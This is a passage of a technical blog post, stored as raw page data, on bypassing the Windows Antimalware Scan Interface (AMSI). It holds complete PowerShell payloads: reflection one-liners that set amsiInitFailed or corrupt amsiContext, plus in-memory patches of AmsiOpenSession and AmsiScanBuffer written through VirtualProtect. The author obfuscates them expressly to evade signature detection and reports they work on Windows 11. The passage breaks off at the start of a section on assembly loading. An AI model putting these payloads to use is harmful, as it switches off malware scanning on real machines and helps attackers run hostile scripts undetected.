down:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_50":{"__typename":"Paragraph","id":"4780fc344bbe_50","name":"4b88","type":"P","href":null,"layout":null,"metadata":null,"text":"1: Get the assembly that Ref is defined in, then get a list of all types defined in that assembly\n2: In the list, locate AmsiUtils based on the property characteristics of AmsiUtils, such as IsPublic=False, IsSerial=False, and the Name contains the “iUtils” substring, etc.\n3: Locate amsiContext in a similar manner\n4: Get the address of the amsiContext parameter and patch the first DWORD in the structure to 0","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_51":{"__typename":"Paragraph","id":"4780fc344bbe_51","name":"846c","type":"P","href":null,"layout":null,"metadata":null,"text":"Adjust the payload to patch the 2nd QWORD, and it works on Windows 11.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_52":{"__typename":"Paragraph","id":"4780fc344bbe_52","name":"d96f","type":"PRE","href":null,"layout":null,"metadata":null,"text":"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*7s139sMAVWUVtEcz.png":{"__typename":"ImageMetadata","id":"0*7s139sMAVWUVtEcz.png","originalHeight":532,"originalWidth":1463,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_53":{"__typename":"Paragraph","id":"4780fc344bbe_53","name":"b20b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*7s139sMAVWUVtEcz.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_54":{"__typename":"Paragraph","id":"4780fc344bbe_54","name":"f870","type":"P","href":null,"layout":null,"metadata":null,"text":"We can also attack AmsiOpenSession with PowerShell script. The following script patched AmsiOpenSession to set RCX as 0.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*s5mW1UucyXzK737_.png":{"__typename":"ImageMetadata","id":"0*s5mW1UucyXzK737_.png","originalHeight":716,"originalWidth":931,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_55":{"__typename":"Paragraph","id":"4780fc344bbe_55","name":"5d82","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*s5mW1UucyXzK737_.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_56":{"__typename":"Paragraph","id":"4780fc344bbe_56","name":"9853","type":"PRE","href":null,"layout":null,"metadata":null,"text":"function LookupFunc {\n    Param ($moduleName, $functionName)\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |\n    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].\n     Equals('System.dll')\n     }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $tmp=@()\n    $assem.GetMethods() | ForEach-Object {If($_.Name -like \"Ge*P*oc*ddress\") {$tmp+=$_}}\n    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,\n@($moduleName)), $functionName))\n}\n\n\nfunction getDelegateType {\n    Param (\n     [Parameter(Position = 0, Mandatory = $True)] [Type[]]\n     $func, [Parameter(Position = 1)] [Type] $delType = [Void]\n    )\n    $type = [AppDomain]::CurrentDomain.\n    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('InMemoryModule', $false).\n    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,\n    AutoClass', [System.MulticastDelegate])\n\n  $type.\n    DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard, $func).\n     SetImplementationFlags('Runtime, Managed')\n\n  $type.\n    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,\n$func). SetImplementationFlags('Runtime, Managed')\n    return $type.CreateType()\n}\n\n\n[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession\n$oldProtectionBuffer = 0\n$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))\n$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)\n$buf = [Byte[]] (0x48,0x31,0xc9)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_57":{"__typename":"Paragraph","id":"4780fc344bbe_57","name":"633f","type":"P","href":null,"layout":null,"metadata":null,"text":"After executing the script, we bypassed AMSI.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*XAeyE1IxocZ84RDz.png":{"__typename":"ImageMetadata","id":"0*XAeyE1IxocZ84RDz.png","originalHeight":473,"originalWidth":1423,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_58":{"__typename":"Paragraph","id":"4780fc344bbe_58","name":"0e33","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*XAeyE1IxocZ84RDz.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_59":{"__typename":"Paragraph","id":"4780fc344bbe_59","name":"20c8","type":"H3","href":null,"layout":null,"metadata":null,"text":"Attack AmsiInitialize","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_60":{"__typename":"Paragraph","id":"4780fc344bbe_60","name":"37dc","type":"P","href":null,"layout":null,"metadata":null,"text":"Considering AmsiInitialize is called before we can supply scripts, we cannot directly patch the instruction. However, we can patch the structure pointed by amsiContext as it is initialized after the execution.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_61":{"__typename":"Paragraph","id":"4780fc344bbe_61","name":"9742","type":"P","href":null,"layout":null,"metadata":null,"text":"Leverage reflection, the raw one-liner payload is as follows:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_62":{"__typename":"Paragraph","id":"4780fc344bbe_62","name":"bf53","type":"PRE","href":null,"layout":null,"metadata":null,"text":"[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_63":{"__typename":"Paragraph","id":"4780fc344bbe_63","name":"1489","type":"P","href":null,"layout":null,"metadata":null,"text":"Obfuscate it to avoid signature-based detection:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_64":{"__typename":"Paragraph","id":"4780fc344bbe_64","name":"b0e5","type":"PRE","href":null,"layout":null,"metadata":null,"text":"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};$d=$c.GetFields(‘NonPublic,Static’);Foreach($e in $d) {if ($e.Name -like “*Failed”) {$f=$e}};$f.SetValue($null,$true)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_65":{"__typename":"Paragraph","id":"4780fc344bbe_65","name":"6c11","type":"P","href":null,"layout":null,"metadata":null,"text":"We successfully bypassed AMSI. This payload still works, even on Windows 11.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*JXoSzgYUG8VpeWPw.png":{"__typename":"ImageMetadata","id":"0*JXoSzgYUG8VpeWPw.png","originalHeight":480,"originalWidth":1466,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_66":{"__typename":"Paragraph","id":"4780fc344bbe_66","name":"e242","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*JXoSzgYUG8VpeWPw.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_67":{"__typename":"Paragraph","id":"4780fc344bbe_67","name":"5aca","type":"H3","href":null,"layout":null,"metadata":null,"text":"Attack AmsiScanBuffer","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_68":{"__typename":"Paragraph","id":"4780fc344bbe_68","name":"dec4","type":"P","href":null,"layout":null,"metadata":null,"text":"Inspect assemble codes of AmsiScanBuffer, we also noticed the code block that forces the function to exit with error.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*7RM90CuLMXCMc9Wv.png":{"__typename":"ImageMetadata","id":"0*7RM90CuLMXCMc9Wv.png","originalHeight":796,"originalWidth":1487,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_69":{"__typename":"Paragraph","id":"4780fc344bbe_69","name":"5b42","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*7RM90CuLMXCMc9Wv.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*-yLptILQYb4SR0Bj.png":{"__typename":"ImageMetadata","id":"0*-yLptILQYb4SR0Bj.png","originalHeight":980,"originalWidth":840,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_70":{"__typename":"Paragraph","id":"4780fc344bbe_70","name":"f566","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*-yLptILQYb4SR0Bj.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*R-BFQLaszSlQMUpH.png":{"__typename":"ImageMetadata","id":"0*R-BFQLaszSlQMUpH.png","originalHeight":497,"originalWidth":1237,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_71":{"__typename":"Paragraph","id":"4780fc344bbe_71","name":"6424","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*R-BFQLaszSlQMUpH.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_72":{"__typename":"Paragraph","id":"4780fc344bbe_72","name":"27c2","type":"P","href":null,"layout":null,"metadata":null,"text":"According to the graph, multiple branches could land the execution on the code block. One path is notable:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_73":{"__typename":"Paragraph","id":"4780fc344bbe_73","name":"d92d","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmp rcx, rax\njz short loc_1800082CA","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_74":{"__typename":"Paragraph","id":"4780fc344bbe_74","name":"565f","type":"P","href":null,"layout":null,"metadata":null,"text":"The code block compares values stored in RAX and RCX, because RCX and RAX will be overwritten later, it is hard to patch them.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":41,"end":45,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":49,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*7TQujHs9MLR8Tr1Y.png":{"__typename":"ImageMetadata","id":"0*7TQujHs9MLR8Tr1Y.png","originalHeight":204,"originalWidth":491,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_75":{"__typename":"Paragraph","id":"4780fc344bbe_75","name":"1cfc","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*7TQujHs9MLR8Tr1Y.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_76":{"__typename":"Paragraph","id":"4780fc344bbe_76","name":"fb9e","type":"P","href":null,"layout":null,"metadata":null,"text":"If RCX does not equal RCX, the execution will land the following code block. The TEST operation will be performed between the byte located at the memory address RCX+0x14 and immediate value 4. This means, if the 3rd bit is set in the byte.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":122,"end":169,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_77":{"__typename":"Paragraph","id":"4780fc344bbe_77","name":"0ef8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"test byte ptr [rcx+1Ch], 4\njz short loc_1800082CA","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_78":{"__typename":"Paragraph","id":"4780fc344bbe_78","name":"a84b","type":"P","href":null,"layout":null,"metadata":null,"text":"If the result is not equal to 0, the execution lands the following code block:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_79":{"__typename":"Paragraph","id":"4780fc344bbe_79","name":"d260","type":"PRE","href":null,"layout":null,"metadata":null,"text":"mov rcx, [rcx+10h]\nmov r9, rbx\nmov [r11-50h], rbp\nmov [r11-58h], r14\nmov [rsp+88h+var_60], r8d\nmov [r11-68h], rdx\ncall WPP_SF_qqDqq","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_80":{"__typename":"Paragraph","id":"4780fc344bbe_80","name":"65c8","type":"P","href":null,"layout":null,"metadata":null,"text":"No conditional jump happens, just follow the execution, and land the following code block. Previously, RSI is set the value stored in RDX, which is the address of buffer.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_81":{"__typename":"Paragraph","id":"4780fc344bbe_81","name":"dcc9","type":"PRE","href":null,"layout":null,"metadata":null,"text":"mov rsi, rdx","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_82":{"__typename":"Paragraph","id":"4780fc344bbe_82","name":"6ef9","type":"P","href":null,"layout":null,"metadata":null,"text":"If RSI is not equal to zero, continue the execution without a conditional jump.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_83":{"__typename":"Paragraph","id":"4780fc344bbe_83","name":"d9db","type":"PRE","href":null,"layout":null,"metadata":null,"text":"loc_1800082CA:\ntest rsi, rsi\njz short loc_180008337","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_84":{"__typename":"Paragraph","id":"4780fc344bbe_84","name":"788d","type":"P","href":null,"layout":null,"metadata":null,"text":"The following code block checks if EDI is equal to 0. Previously, EDI is set the value stored in R8D.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":35,"end":39,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":97,"end":100,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_85":{"__typename":"Paragraph","id":"4780fc344bbe_85","name":"b64a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"mov edi, r8d","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_86":{"__typename":"Paragraph","id":"4780fc344bbe_86","name":"050f","type":"P","href":null,"layout":null,"metadata":null,"text":"It is obvious, if R8 is 0, then we will finally reach mov eax, 0x80070057 instruction.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":73,"end":86,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_87":{"__typename":"Paragraph","id":"4780fc344bbe_87","name":"832a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"test edi, edi\njz short loc_180008337","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_88":{"__typename":"Paragraph","id":"4780fc344bbe_88","name":"6bb9","type":"P","href":null,"layout":null,"metadata":null,"text":"Set R8 as 0 at the entry of function AmsiScanBuffer, continue the execution. We find that AMSI is bypassed.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":4,"end":6,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":10,"end":11,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*HKxEogB0L0qm_DSr.png":{"__typename":"ImageMetadata","id":"0*HKxEogB0L0qm_DSr.png","originalHeight":167,"originalWidth":1253,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_89":{"__typename":"Paragraph","id":"4780fc344bbe_89","name":"e986","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*HKxEogB0L0qm_DSr.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*535DOtUEucPN4mAi.png":{"__typename":"ImageMetadata","id":"0*535DOtUEucPN4mAi.png","originalHeight":503,"originalWidth":1438,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_90":{"__typename":"Paragraph","id":"4780fc344bbe_90","name":"b359","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*535DOtUEucPN4mAi.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_91":{"__typename":"Paragraph","id":"4780fc344bbe_91","name":"5383","type":"P","href":null,"layout":null,"metadata":null,"text":"If we try to patch AmsiScanBuffer by setting R8 to 0:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_92":{"__typename":"Paragraph","id":"4780fc344bbe_92","name":"bbf1","type":"PRE","href":null,"layout":null,"metadata":null,"text":"xor r8, r8;","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_93":{"__typename":"Paragraph","id":"4780fc344bbe_93","name":"6b31","type":"P","href":null,"layout":null,"metadata":null,"text":"The opcode is 0x4d31c0. However, it will crash powershell.exe process, because we overwrote some instructions, such as mov r11, rsp. While R11 will be used in some following instructions.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":14,"end":23,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":119,"end":131,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*anc0ZLd3vYZq2RD_.png":{"__typename":"ImageMetadata","id":"0*anc0ZLd3vYZq2RD_.png","originalHeight":101,"originalWidth":516,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_94":{"__typename":"Paragraph","id":"4780fc344bbe_94","name":"f560","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*anc0ZLd3vYZq2RD_.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*lz-6io2CPLQZ0Hs7.png":{"__typename":"ImageMetadata","id":"0*lz-6io2CPLQZ0Hs7.png","originalHeight":140,"originalWidth":523,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_95":{"__typename":"Paragraph","id":"4780fc344bbe_95","name":"c699","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*lz-6io2CPLQZ0Hs7.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_96":{"__typename":"Paragraph","id":"4780fc344bbe_96","name":"9b5a","type":"P","href":null,"layout":null,"metadata":null,"text":"Therefore, this bypass works in theory, but we will have issues when using it in practical without WinDBG.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_97":{"__typename":"Paragraph","id":"4780fc344bbe_97","name":"56c3","type":"P","href":null,"layout":null,"metadata":null,"text":"We can also force AmsiScanbuffer to return E_INVALIDARG error, the instructions are as follows:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":43,"end":56,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_98":{"__typename":"Paragraph","id":"4780fc344bbe_98","name":"dba1","type":"PRE","href":null,"layout":null,"metadata":null,"text":"mov eax, 0x80070057\nret","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_99":{"__typename":"Paragraph","id":"4780fc344bbe_99","name":"acd0","type":"P","href":null,"layout":null,"metadata":null,"text":"The opcode is 0xb857000780c3. However, the opcode is signatured, therefore, we should slightly obfuscate it.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":13,"end":28,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*N8cNK4Od4Te1qW-t.png":{"__typename":"ImageMetadata","id":"0*N8cNK4Od4Te1qW-t.png","originalHeight":799,"originalWidth":916,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_100":{"__typename":"Paragraph","id":"4780fc344bbe_100","name":"422c","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*N8cNK4Od4Te1qW-t.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_101":{"__typename":"Paragraph","id":"4780fc344bbe_101","name":"27b1","type":"P","href":null,"layout":null,"metadata":null,"text":"Final code:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_102":{"__typename":"Paragraph","id":"4780fc344bbe_102","name":"7e93","type":"PRE","href":null,"layout":null,"metadata":null,"text":"function LookupFunc {\n    Param ($moduleName, $functionName)\n    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |\n    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].\n     Equals('System.dll')\n     }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n    $tmp=@()\n    $assem.GetMethods() | ForEach-Object {If($_.Name -like \"Ge*P*oc*ddress\") {$tmp+=$_}}\n    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,\n@($moduleName)), $functionName))\n}\n\n\nfunction getDelegateType {\n    Param (\n     [Parameter(Position = 0, Mandatory = $True)] [Type[]]\n     $func, [Parameter(Position = 1)] [Type] $delType = [Void]\n    )\n    $type = [AppDomain]::CurrentDomain.\n    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('InMemoryModule', $false).\n    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,\n    AutoClass', [System.MulticastDelegate])\n\n  $type.\n    DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard, $func).\n     SetImplementationFlags('Runtime, Managed')\n\n  $type.\n    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,\n$func). SetImplementationFlags('Runtime, Managed')\n    return $type.CreateType()\n}\n\n\n$a=\"A\"\n$b=\"msiS\"\n$c=\"canB\"\n$d=\"uffer\"\n[IntPtr]$funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)\n$oldProtectionBuffer = 0\n$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))\n$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)\n$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)\n[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"EXPLICIT","lang":"shell"},"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_103":{"__typename":"Paragraph","id":"4780fc344bbe_103","name":"73c1","type":"P","href":null,"layout":null,"metadata":null,"text":"It works well : )","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*4pfK9pvp7NE33hSz.png":{"__typename":"ImageMetadata","id":"0*4pfK9pvp7NE33hSz.png","originalHeight":480,"originalWidth":1421,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:4780fc344bbe_104":{"__typename":"Paragraph","id":"4780fc344bbe_104","name":"db75","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*4pfK9pvp7NE33hSz.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_105":{"__typename":"Paragraph","id":"4780fc344bbe_105","name":"55ff","type":"H3","href":null,"layout":null,"metadata":null,"text":"Bypass AMSI for Assembly Load","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:4780fc344bbe_106":{"__typename":"Paragraph","id":"4780fc344bbe_106","name":"b4e4","type":"P","href":null,"layout":null,"metadata":null,"text":"We discussed how to bypass AMSI before executing powershell scripts. However, the content of .NET assembly will also be scanned by AMSI, and the process is slightly different. As a result, attacking AmsiInitialize or AmsiOpenSession does not 